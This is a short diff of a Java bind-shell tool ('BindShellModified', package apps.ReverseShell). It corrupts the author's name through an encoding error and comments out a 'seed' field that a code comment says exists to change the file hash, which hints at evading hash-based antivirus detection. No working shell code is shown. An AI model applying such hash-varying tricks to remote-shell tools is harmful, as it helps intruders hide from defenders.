@@ -1,6 +1,6 @@
 package apps.ReverseShell;
 
-//Copyright (c) 2021 Ivan Šincek
+//Copyright (c) 2021 Ivan ï¿½incek
 //Requires Java SE v8 or greater and JDK v8 or greater.
 //Works on Linux OS, macOS, and Windows OS.
 
@@ -17,7 +17,7 @@ import java.util.Scanner;
 public class BindShellModified {
  
  // NOTE: Change seed to help you change the file hash.
- private String seed    = "3301Kira";
+ //private String seed    = "3301Kira";
  private int     port   = -1;
  private String  os     = null;
  private String  shell  = null;
